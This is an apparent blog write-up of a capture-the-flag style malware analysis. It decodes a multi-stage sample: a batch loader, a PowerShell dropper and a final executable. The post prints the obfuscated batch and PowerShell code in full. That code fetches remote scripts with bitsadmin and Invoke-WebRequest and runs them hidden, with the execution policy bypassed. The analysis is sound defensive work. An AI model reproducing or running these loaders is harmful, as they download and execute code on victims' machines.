---
layout: post
title: "Multi Stage"
date: 2025-04-21 11:00:00 +0800
categories: [writeup ,malware analysis]
tags: [writeup, malware analysis]
image: https://miro.medium.com/v2/resize:fit:272/format:webp/1*8jRzQ9YRzqdEy3xYTu3kKQ.png
---

# 🐞 Malware analysis

Analysis on malware that operates through multiple phases.

Multi-stage malware is a sophisticated type of malicious software designed to execute in multiple phases, often evading detection by traditional security measures. Unlike single-stage malware, which executes its payload immediately, multi-stage malware follows a structured execution path, usually involving an initial dropper, loaders, and a final payload.

In the challenge I was given the malicious program zip file named multistage.zip. I extracted it in a controlled environment in my kali linux vmware sandbox. After extracting it there is a multistage file. Going through the file i have located the possible malicious program file which is called stacysmom.bat which is a windows batch file.


<figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:272/format:webp/1*8jRzQ9YRzqdEy3xYTu3kKQ.png" alt="Process List" style="display:block; margin: 0 auto; max-width: 100%;">
  <figcaption><em>the multi stage folder after extraction</em></figcaption>
</figure>


<figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:272/format:webp/1*hWaufeSZDLSlPpFTQrUMAQ.png" alt="Process List" style="display:block; margin: 0 auto; max-width: 100%;">
  <figcaption style="text-align:center;"><em>the malware file in .bat extension</em></figcaption>
</figure>

A `.bat` file is a simple script file used in the Microsoft Windows operating system to automate tasks or run commands. When you double-click a `.bat` file or execute it , the `cmd.exe` reads the commands within the file and executes them sequentially.

``` bat
@echo off &setlocal
set eitg=set
set gopy=for
REM ZGlzdHJhY3QK
set hetY="tokens=* delims=" && set GhEt=in && set SADFCweFDCWQE=/f
REM VGhlc2UK
set VCWErqw=" " && set FWEfvrewFWRVEwer=dG#######hpc##########yB#####pc##########yBraW5k#####Y#######SBv######Zi######Bwb2l##########ud#######Gx#####lc#########3M######K###### && set POUINTYEBRTwertf=R!!!!!!m!!!!!!!!!x5aW5n!!!!!!!IHNh!!!!!!!!!dWNl!!!!!!!!!c!!!!!!!!n!!!!!!!!!Mg!!!!!!!!!!b2Z!!!!!!!!!0ZW4gY3!!!!!!!!!J!!!!!!!vc3Mg!!!!!!!bXkgbWlu!!!!!!Z!!!!!!!!!C!!!!!!B!!!!!!3!!!!!!!!aGV!!!!!!uI!!!!!!!EknbSBoa!!!!!!!Wdo!!!!!!!!!IEk!!!!!!!!n!!!!!!!!bSB0!!!!!!cmlwcGl!!!!!!!uJ!!!!!!w!!!!!o=!!!!! && set WeTTyhRRvfer=c@@@@@@3R@@@@h@@@@@@@@@Y3k@@@ucH@@@@@@@M@@@xCg@@@==@@@@@@@ && set VerBrtEwFCWe=a!!!!!!H!!!!!R0c!!!!!HM!!!!!!!!!6!!!!!!!!!L!!!!!y!!!!!9!!!!!y!!!!!!!!!!YXc!!!!!!!uZ2!!!!!l0aHVi!!!!!!!!!d!!!!!!!!!!X!!!!!!!!NlcmNvb!!!!!!!!!n!!!!!!!!RlbnQu!!!!!!!!!!Y29tL!!!!!!!0ludG!!!!!!!!!!Vyb!!!!!!m!!!!!!V!!!!!!0LTItM!!!!!!!C!!!!!!!9m!!!!!!a!!!!!!!W!!!!!!!!!!xl!!!!!!!!!!L!!!!!!!X!!!!!N!!!!!h!!!!!!!!bX!!!!!!!!!!B!!!!!!!s!!!!!!!!!!Z!!!!!XMvbWF!!!!!!z!!!!!!!!!!d!!!!!!!!GV!!!!!!!!!!y!!!!!!!!!!L3N!!!!!!jcm!!!!!!!!!!lwdHMvc!!!!!G!!!!!!!!!!9!!!!!!!!3ZXJzaG!!!!!!!!V!!!!!!!!!sbC9z!!!!!!!!!!d!!!!!!!GFjeS5wc!!!!!!zE!!!!!!K!!!!!!! && set WERtggbvtrWERV=W1N5c!!!!!!!!!!3!!!!!!!!!Rlb!!!!!S5UZXh0LkVuY29ka!!!!!W5!!!!!!nX!!!!!!!!!!To6!!!!!V!!!!!V!!!!!!!!RG!!!!!!!!!!O!!!!!!!!!C5HZXR!!!!!!T!!!!!!!!!!d!!!!!H!!!!!!!Jp!!!!!!!!!!b!!!!!!!!mcoW1N!!!!!!!!5!!!!!c3RlbS5D!!!!!!!!b!!!!!!!25!!!!!!!2!!!!!!ZXJ!!!!!!!0XTo6Rn!!!!!!!!!J!!!!!!!!!!v!!!!!!!!!!bUJh!!!!!!c!!!!!2!!!!!!U2!!!!!!!!!NFN!!!!!!!!!!0!!!!!!!!!cmluZw!!!!!!!!!!o= && set NTYerFVERHetERfewef=Y@@@@@@ml0c2Fk@@@@@@@b@@@@@@@@@WluLmV4@@@@@@@@@ZS@@@@@@A@@@@@@v@@@@@@@@@d@@@@@@@HJh@@@@@@bnNmZXI@@@@@@@@K@@@@@@@@@@ && set BRTwercvWQEFRWE=Mjc!!!!!!!!5!!!!!!!NWUx!!!!!!Nm!!!!!!!!!!Q!!!!!wM!!!!!!!DYx!!!!!!!ZjI0!!!!!!!!Yzkx!!!!!!M2My!!!!!NjAyY!!!!!!!!zI0NTM1Y!!!!!!!!!2F!!!!!!j!!!!!!!Mj!!!!!!!!!A!!!!!!!!!!yND!!!!!!!d!!!!!!!!!j!!!!!!!Mj!!!!!!!!Vj!!!!!!!OWM!!!!!!zNmE4!!!!!!!!!!O!!!!!WQyM!!!!!!!!!!GFk!!!!!!!!!NDgy!!!!!!!!!MGJj!!!!!!!!!NGI3M!!!!!i!!!!!!A!!!!!!!!!!gZ3Jv!!!!!!dX!!!!!!!BzLmpzb2!!!!!!!!4KOG!!!!!!!!!!NiMW!!!!!Zl!!!!!!!!M!!!!!!!!!GU!!!!!!!!!5YTQ!!!!!!yOGYxY!!!!!!!!!!TN!!!!!!!!!m!!!!!!!!!!ZmE!!!!!!3O!!!!!!T!!!!!!!!!c2!!!!!!!!!M2!!!!!!U5Y!!!!!!!TBi!!!!!!!!!!NTg!!!!!!!x!!!!!N!!!!!!!!!zV!!!!!!!!!h!!!!!!Z!!!!!j!!!!!!g!!!!!!!!!4NmZmM!!!!!!!!!!2!!!!!!!!!!J!!!!!mO!!!!!TFm!!!!!!!!!!Mz!!!!!!!Ew!!!!!!Z!!!!!jQ4ZGQ!!!!!!!!!4Y!!!!!TJ!!!!!hNj!!!!!!!!!M4ZC!!!!!AgcH!!!!!!!!J!!!!!!!l!!!!!dHR5X2!!!!!!!!!dyb3Vwcy!!!!!!!!!5qc29u!!!!!!!Cg!!!!!!!!!=!!!!!!!!!=!!!!!!! && set RTYbrtgVEWRqqwer=LU5vUC@@@@@@At@@@@@@@@@d@@@@@2l@@@@@@@@@@O@@@@@@@ZG93@@@@@@U@@@@@@@@1@@@@@RZTEU@@@@@@@gaGl@@@@@kZ@@@@@@GVOI@@@@@@@@C1@@@@@@@@F@@@@@@@@e@@@@@@@@@E@@@@@@@@@V@@@@@@j@@@@@@@@@d@@@@@@@V@@@@@@@@R@@@@@@p@@@@@@@@@@b05Q@@@@@@@@@@b2@@@@@@xpY3@@@@@kgQn@@@@@lw@@@@@@@@@QX@@@@@NzI@@@@@@@@C@@@@@@1Db01@@@@@@@@@@tQU@@@@@5EC@@@@@g==
REM Y29tbWVudHMK
set WERvtreVRETqwefewr=Zj########Q4OTI#w######ZTU######zN2#####Q#####5#####Y#########zRl####MG##U######3#########OTU#########5####Nz##FkYTM2##########NDY0ND##########Q######xOT######B#lZWNk###Mj######R#######k########N####z###E#####5MzAzYmV##j######ZG##Q########5Y##T####E#####zY########mZh######NTg#####xMAo#########= && set ERTHbrteQE=VGh@@@@@@@@@@pcyB@@@@@@@k@@@@@@@@b2Vzbn@@@@@@QgZG@@@@@@@@8@@@@@@gYW5@@@@@@@@5dG@@@@@@@@h@@@@@@@@@p@@@@@@bmcg@@@@@@YW5@@@@@@@@@@k@@@@@IH@@@@@@@@@l@@@@@@@@vdSd@@@@@yZ@@@@@SB@@@@@@@@@3Y@@@@@@@@@@XN0aW@@@@@@5nI@@@@@@@@Hl@@@@@@@@@vdX@@@@@@@Igd@@@@@@@@Gl@@@@@tZ@@@@@@Qo=@@@@@=@@@@@@@@@@ && set OIYuhrTRE=cG!!!!!!!!9!!!!!!!!!3!!!!!!!!ZX!!!!!!!!!Jz!!!!!!!a!!!!!!!!GVsb!!!!!!!!!!C!!!!!!!5le!!!!!!G!!!!!UK && set QWERVTrgbyRTGTREW=QnV#########5I#########G1lI##########G######Eg#####bW9######0aG########Vy#########I#########G########Z#####1Y2#########t#########p########bmcgZ##########2lyYW######ZmZQ##########o=######### && set QWErfqwfecQWEDWEX=%VerBrtEwFCWe:!=%
REM REM eW91Cg==
set QWEcwgrtHWTFWEQaxwe=%WeTTyhRRvfer:@=% && set RTYUvERQCXergtewsr=%WERvtreVRETqwefewr:#=% && set OYUIThbgrwtWCVRE=%OIYuhrTRE:!=%
REM YXJlCg==
set NETRYverEWERCREWweq=%RTYbrtgVEWRqqwer:@=%
set DwqeqwefWEFqwer=%WERtggbvtrWERV:!=%
REM ZGVzaWduZWQK
set ERTYbrtWCRWEfverwfcwer=%NTYerFVERHetERfewef:@=%
set SDFweFCWEwCWERwFWE=%ERTYbrtWCRWEfverwfcwer%%DwqeqwefWEFqwer%%NETRYverEWERCREWweq%%QWEcwgrtHWTFWEQaxwe%
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%OYUIThbgrwtWCVRE%"""^)^)') do set "CVWQeFEWRFQWEd=%%#"
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%DwqeqwefWEFqwer%"""^)^)') do set "WreqwecQWEFRWE=%%#"
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% %WreqwecQWEFRWE%("""%QWErfqwfecQWEDWEX%"""^)^)') do set "KIUYntyERverERF=%%#"
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% %WreqwecQWEFRWE%("""%QWEcwgrtHWTFWEQaxwe%"""^)^)') do set "NbfdsvREVntySRE=%%#"
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% %WreqwecQWEFRWE%("""%RTYUvERQCXergtewsr%"""^)^)') do set "iUYTbyteVERTfer=%%#"
REM dG8K
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% %WreqwecQWEFRWE%("""%NETRYverEWERCREWweq%"""^)^)') do set "QWWEcdweWERee=%%#"
%gopy% %SADFCweFDCWQE% %hetY% %%# %GhEt% ('%CVWQeFEWRFQWEd% %WreqwecQWEFRWE%("""%ERTYbrtWCRWEfverwfcwer%"""^)^)') do set "QWERfcerWEDfcvtbytTYR=%%#"
%QWERfcerWEDfcvtbytTYR% "%iUYTbyteVERTfer%" %KIUYntyERverERF% %cd%\%NbfdsvREVntySRE% && %CVWQeFEWRFQWEd% %QWWEcdweWERee% "%cd%\%NbfdsvREVntySRE%"


```
 

## **What windows tool used by to download the second stage payload?**

 I opened the `.bat` file using a text editor called Mousepad and observed that the code was heavily obfuscated, containing a mixture of random-looking symbols and meaningless strings, making it difficult to interpret at first glance. 
 
 Additionally, parts of the code were encoded in Base64, as indicated by the format and structure of the encoded strings. I noticed the use of the `&&` symbol, which in batch files is used to chain commands.
 
 So, I separated the commands accordingly to better analyze them. To confirm that the code was Base64-encoded, I extracted a portion of it and decoded it.

<figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*C24azyzRynbYQmpYMDrdoA.png" alt="Process List" style="display:block; margin: 0 auto; max-width: 100%;">
  <figcaption style="text-align:center;"><em>portion of the code decoded</em></figcaption>
</figure>

Using the cyberchef website i decoded a part from the text using the from base 64 option and remove non alphabet characters and got the decode text as shown on the picture. As it is confirmed the text is encoded as base64 i decoded it and got the decoded text.

``` bat
set VCWErqw=" " && 
set FWEfvrewFWRVEwer=this is kinda of pointless&& 
set POUINTYEBRTwertf= Flying saucers often cross my mind when I'm high I'm trippin' &&
set WeTTyhRRvfer=stacy.ps1&& 
set VerBrtEwFCWe=https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 &&
set WERtggbvtrWERV=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String && 
set NTYerFVERHetERfewef= bitsadmin.exe /transfer &&
set BRTwercvWQEFRWE=2795e16d0061f24c913c2602c24535cac20247c25c9c36a89d20ad4820bc4b72  groups.json
8cb1fe0e9a428f1a3ffa79763e9a0b58175af886ff3bf91f310f48dd8a2a638d  pretty_groups.json &&
set RTYbrtgVEWRqqwer= -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND

```

From the decoded text we now have a link to the second stage of the malware.A suspicious PowerShell script was identified leveraging obfuscated variables, Base64 decoding, and the bitsadmin utility to stealthily download and execute a remote payload (`stacy.ps1`) from GitHub, while employing execution policy bypasses and hidden window execution—indicative of potential malware loader behavior.

**Answer: bitsadmin**

## **Find the link to the third stage of the malware ?**

Upon reviewing the linked PowerShell script `stacy.ps1`, it was found to be heavily obfuscated, using randomized variables, Base64 decoding, and encoded shellcode to reconstruct and execute a malicious binary `stacy.exe`. The script downloads the payload via Invoke-WebRequest, extracts it, and launches it using execution policy bypass techniques—indicative of malware dropper behavior.

``` powershell
function llIIllIIllIIllIIllIIllIIllIIllIIllII($vP9MZDGjnoJ) {$Mohfy6VuAN25tmCcilWJ = "\x90";$xgWjzvyhbOVsU6La79 = $vP9MZDGjnoJ.replace($Mohfy6VuAN25tmCcilWJ, " ") -split " ";$Mt = $xgWjzvyhbOVsU6La79.clone();[array]::reverse($Mt);$MXfstqmCoh2iTbaGnwr0j4Ny = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Mt));return $MXfstqmCoh2iTbaGnwr0j4Ny; }
function llIIllIIllIIllIIIIIIllIIllIlllllllII($7lGQcpZoLf6Yk2CPEezSv) {$6cZyHm8aYQX=-join ((0x41..0x5a) + (0x61..0x7a) | Get-Random -Count 20 | % {[char]$_});return "$6cZyHm8aYQX$7lGQcpZoLf6Yk2CPEezSv" }
$hg34RNfykz5XdxBn287mU9=llIIllIIllIIllIIllIIllIIllIIllIIllII("=\x90A\x90X\x90a\x906\x905\x90S\x90b\x90v\x901\x902\x90c\x905\x90N\x90W\x90Y\x900\x90N\x903\x90L\x90j\x90N\x90X\x90a\x90t\x909\x90i\x90c\x90l\x90R\x903\x90c\x90h\x901\x902\x90L\x903\x90F\x90m\x90c\x90v\x90M\x90X\x90Z\x90s\x90B\x90X\x90b\x90h\x90N\x90X\x90L\x90l\x90x\x90W\x90a\x90m\x909\x90C\x90M\x90t\x90I\x90T\x90L\x900\x90V\x90m\x90b\x90y\x90V\x90G\x90d\x90u\x90l\x900\x90L\x90t\x909\x902\x90Y\x90u\x90I\x90W\x90d\x90o\x90R\x90X\x90a\x90n\x909\x90y\x90L\x906\x90M\x90H\x90c\x900\x90R\x90H\x90a\x90");$tQsoNjk=llIIllIIllIIllIIllIIllIIllIIllIIllII("l\x90h\x90X\x90Z\x90u\x90w\x90G\x90b\x90l\x90h\x902\x90c\x90y\x90V\x902\x90d\x90v\x90B\x90H\x90X\x90w\x904\x90S\x90M\x902\x90x\x90F\x90b\x90s\x90V\x90G\x90a\x90T\x90J\x90X\x90Z\x903\x909\x90G\x90U\x90z\x90d\x903\x90b\x90k\x905\x90W\x90a\x90X\x90x\x90l\x90M\x90z\x900\x90W\x90Z\x900\x90N\x90X\x90e\x90T\x90x\x901\x90c\x903\x909\x90G\x90Z\x90u\x90l\x902\x90V\x90c\x90p\x90z\x90Q");$RXNPxpB=llIIllIIllIIllIIIIIIllIIllIlllllllII(".zip");$CcAn4K8e=llIIllIIllIIllIIIIIIllIIllIlllllllII("");Invoke-WebRequest $hg34RNfykz5XdxBn287mU9 -OutFile $RXNPxpB;Expand-Archive $RXNPxpB -DestinationPath $CcAn4K8e; & $tQsoNjk -exECUtIonPOLicY bYpAsS stArT-ProcEss -FilepaTH ".\$CcAn4K8e\stacy.exe";
```

The PowerShell script was hidden and difficult to understand. To uncover its purpose, I used CyberChef, a tool that helps decode obfuscated data.

First, I removed unnecessary `\x90` characters from the script. These characters didn’t serve any purpose and were only there to confuse the analysis. I also removed the extra equal signs `=` that were part of the Base64 encoding, as they weren’t needed.

Next, I reversed the string because the code was written backward to make it harder to read. After that, I decoded the string from Base64, which revealed the original URL and other information.

 <figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*Go0EzfT11WEuPoQHDFzmaQ.png" alt="Process List" style="display:block; margin: 0 auto; max-width: 100%;">
  <figcaption style="text-align:center;"><em>using cyberchef</em></figcaption>
</figure>

 <figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*9bjway9wj3AvoPUCh3WWcg.png" alt="Process List" style="display:block; margin: 0 auto; max-width: 100%;">
  <figcaption style="text-align:center;"><em>code decoded</em></figcaption>
</figure>

It then extracted the contents and ran an executable file called stacy.exe. The script used PowerShell to run stacy.exe while bypassing security settings to ensure it could execute without restrictions.

In the end, the script was designed to download and run a potentially harmful file.

**Answer: https://github.com/Internet20/filesamples/raw/master/misc/stacysmom.zip**

## **What is the URL the final stage malware trying to access?**

unzip the zip file and open the read me .txt

``` 
This is a publicity stunt done by the Malcore team. 

None of the files in this folder are malicious (if they are it wasn't me), they are just intended to look that way.

Hashes of files in this folder:
- a33a361b45aa3a7b6515ff7771af52632697e30ce7e63aa3a271f4f05a5ea28d  ./.fi/ch_1.lnk
- 6f567d8eea0e83dadea8d14068d40d9445151e24358d20b977e9b7c64d03927e  ./.fi/ed_9.lnk
- 05b3222358004e9704320764f7515283b8d2b09f0248f931c057d23a255a566c  ./.fi/ff_3.lnk
- 041afe89d68bb845ffde722354c13261ddb1bb46776fec0efa180a95fbc994b8  ./autorun.ini
- a3f4edfb57534da9eca838ad64cc73b1a661b3349368bcc6d5097edfd9a602a3  ./cliCk ME fOR inSTrucTioNs.pdf.lnk
- 7ff8e302fec63de5a35b03ef09aff6f5b722de23131b0f82da8f4203efac9d20  ./just_m_logo.ico
- 3aebd76e2877d35949eb21f27eeaad514b21810291628454a92f86de7264b225  ./stacy.exe

Of course always remain cautions when executing unknown files out of a USB you found on the ground at a hacking conference.
```

From this message there was suppose to an .fi directory but i the folder show none. So run this `ls -la ` to show an hidden dirctory and file

``` 
─$ ls -la
total 12772
drwxrwxr-x 4 kali kali    4096 May 16 22:17  .
drwxrwxr-x 3 kali kali    4096 Mar 21 00:32  ..
-rw-rw-r-- 1 kali kali      68 Jul 17  2024  autorun.ini
-rw-rw-r-- 1 kali kali    2673 Jul 17  2024 'cliCk ME fOR inSTrucTioNs.pdf.lnk'
-rw-rw-r-- 1 kali kali    1988 Mar 23 23:18  complet.bat
-rw-r--r-- 1 kali kali    2811 Mar 31 21:17  deobfuscated.bat
-rwxrwxr-x 1 kali kali     570 Mar 23 21:58  deobfuscate.sh
drwxrwxr-x 2 kali kali    4096 Mar 24 00:04  .fi
-rw-rw-r-- 1 kali kali    4286 Jul 16  2024  just_m_logo.ico
-rw-rw-r-- 1 kali kali  421931 Apr  3 22:05  output_stacy.txt
-rw-rw-r-- 1 kali kali  421931 Mar 24 01:34  output.txt
-rw-rw-r-- 1 kali kali   17542 Apr 27 23:43  pyinstxtractor.py
-rw-rw-r-- 1 kali kali     941 Jul 17  2024  README.txt
-rw-rw-r-- 1 kali kali       0 Mar 23 23:33  stacydecompile.bat
-rw-rw-r-- 1 kali kali 6147624 Jul 17  2024  stacy.exe
drwxrwxr-x 4 kali kali    4096 Apr 28 03:57  stacy.exe_extracted
-rw-rw-r-- 1 kali kali    1870 Mar 21 23:07  stacy.ps1
-rw-rw-r-- 1 kali kali    1129 Apr 19 05:52  stacyps1decode.ps1
-rw-r--r-- 1 kali kali    2647 Mar 21 22:54  stacysmom1.bat
-rw-r--r-- 1 kali kali    5646 Mar 23 21:59  stacysmom.bat
-rw-rw-r-- 1 kali kali 5988242 Mar 24 00:03  stacysmom.zip
-rw-rw-r-- 1 kali kali       0 Mar 23 23:58  stacy.zip

```
here i found the .fi directory and change the directory into it

``` 
.
├── ch_1.lnk
├── ed_9.lnk
└── ff_3.lnk

```

i cat the `ch_1.lnk` to view what is in it and found this

```
C:\Program Files\Google\Chrome\
Application"https://link.malcore.io"
(C:\Users\saman\Downloads\just_m_logo.ico
```

**Answer: https://link.malcore.io**
